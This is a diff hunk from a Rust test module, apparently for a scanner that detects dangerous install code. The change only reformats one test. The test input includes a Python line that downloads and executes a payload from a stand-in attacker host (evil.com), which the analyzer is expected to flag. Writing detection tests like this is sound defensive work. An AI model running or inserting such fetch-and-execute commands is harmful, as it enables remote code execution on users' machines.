@@ -242,8 +242,7 @@ mod tests {
 
     #[test]
     fn parameter_length_expansion_does_not_hide_later_install_code() {
-        let ids =
-            analyze("value=${#value}; exec(urlopen('https://evil.com/payload.py').read())");
+        let ids = analyze("value=${#value}; exec(urlopen('https://evil.com/payload.py').read())");
         assert!(has(&ids, "P-INSTALL-PYTHON-EXEC"), "got: {ids:?}");
     }
 
